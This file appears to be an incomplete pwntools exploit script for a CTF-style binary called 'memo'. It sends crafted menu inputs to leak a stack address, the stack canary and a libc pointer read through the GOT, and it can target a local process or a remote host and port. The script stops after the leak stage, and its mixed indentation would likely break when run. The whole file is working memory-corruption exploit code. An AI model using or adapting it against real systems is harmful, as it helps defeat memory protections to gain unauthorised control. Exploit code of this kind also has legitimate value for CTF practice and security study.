#!/usr/bin/env python
#-*- coding: utf-8 -*-

from pwn import *

GOT = 0x601fe0

context.update(arch="amd64", os='linux', log_level="debug")

def launch_gdb():
    context.terminal=['gnome-terminal','-x','bash','-c']
    print "pid: ",str(proc.pidof(r)[0])
    gdb.attach(proc.pidof(r)[0], '''b *0x00400e1d\nc''')

def alloc(data):
    r.sendlineafter('> ', '1')
    if len(data) < 0x29:
        data+="\n"
    r.sendafter('Data: ', data)
    r.recvuntil("[yes/no]")
    r.sendline("yes\x00")
    return

def stackleak(delim):
	r.sendlineafter('> ', '2')
	r.recvuntil(delim+"\n")
        return r.recv(6)

def canaryleak(delim):
    r.sendlineafter('> ', '2')
    r.recvuntil(delim+"\n")
    dump="\x00"+r.recv(7)
    return u64(dump.ljust(8,"\x00"))

def libcleak():
    data="A"*0x18+p64(GOT)
    alloc(data)
    r.sendlineafter('> ', '2')
    r.recvlines(2)
    dump=r.recv(8)
    return dump


def pwn():
    #launch_gdb()
    if REMOTE==False:
        pid=util.proc.pidof(r)[0]
        util.proc.wait_for_debugger(pid)
    
    # Leak ptr to stack buffer
    data='A'*0x1f
    alloc(data)
    buffer=u64(stackleak(data).ljust(8,"\x00"))-0x110
    log.info("Stack: 0x{:08x}".format(buffer))
    
    # Leak canary
    data='A'*0x28
    alloc(data)
    canary=canaryleak(data)
    log.info("Canary: 0x{:08x}".format(canary))
    pause()
    # libc leak
    dump=libcleak()
    print hexdump(dump)

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        REMOTE=True
        pwn()
    else:
        r = process('./memo')
        REMOTE=False
        pwn()
